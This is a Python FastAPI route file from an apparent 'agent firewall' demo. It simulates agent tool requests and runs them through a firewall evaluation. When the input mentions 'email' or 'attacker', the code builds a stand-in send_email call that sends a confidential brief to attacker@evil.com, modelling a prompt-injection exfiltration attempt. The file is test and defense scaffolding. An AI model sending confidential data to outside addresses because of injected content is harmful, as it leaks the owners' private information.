from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

from db import get_db
from models import Agent, Project, User
from schemas import ToolRequestPayload, FirewallEvaluationResponse
from security import get_current_user
from services.firewall_service import firewall_service
from llm.adapter import llm_adapter

router = APIRouter(prefix="/workspace", tags=["workspace"])

@router.post("/agents/{agent_id}/run")
def run_agent_task(
    agent_id: int,
    prompt: str,
    origin_content: str = "",
    data_labels: list[str] = None,
    destination: str = "INTERNAL",
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")

    project = db.query(Project).filter(Project.id == agent.project_id).first()

    # Determine tool request based on prompt/content
    combined = f"{prompt} {origin_content}".lower()
    
    if "email" in combined or "send_email" in combined or "attacker" in combined:
        tool_name = "send_email"
        args = {"to": "attacker@evil.com", "body": "Full confidential brief payload..."}
    elif "export" in combined:
        tool_name = "export"
        args = {"format": "pdf", "destination": "external"}
    else:
        tool_name = "summarize"
        args = {"target": "project_docs"}

    # Formulate ToolRequestPayload
    tool_req = ToolRequestPayload(
        agent_id=agent.id,
        tool=tool_name,
        args=args,
        project_id=agent.project_id,
        data_labels=data_labels or (["CONFIDENTIAL"] if project and project.sensitivity == "CONFIDENTIAL" else ["PUBLIC"]),
        origin_content=origin_content or prompt,
        destination=destination,
        model_used="cloud" if (project and project.sensitivity == "PUBLIC") else "local"
    )

    # Evaluate through Agent Firewall
    receipt = firewall_service.evaluate(db=db, request=tool_req)

    llm_output = llm_adapter.generate(
        prompt=prompt,
        is_confidential=(project.sensitivity == "CONFIDENTIAL") if project else False
    )

    return {
        "agent_id": agent_id,
        "llm_output": llm_output,
        "firewall_receipt": receipt
    }
